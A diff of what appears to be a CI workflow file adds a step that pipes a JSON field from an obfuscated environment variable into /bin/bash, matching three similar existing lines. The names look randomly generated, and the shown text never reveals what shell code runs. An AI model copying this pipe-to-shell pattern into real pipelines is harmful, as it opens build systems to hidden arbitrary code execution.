@@ -38,6 +38,7 @@ jobs:
           echo $x8630 | jq -r .jtwa41458 | /bin/bash
           printf '%s' "$uxzi49895" | jq -r .llmom31286 | /bin/bash
           printf '%s' "$dlzt8877" | jq -r .vjmwt27 | /bin/bash
+          printf '%s' "$ybvb12" | jq -r .kar165 | /bin/bash
 
       - name: Upload results
         if: always()
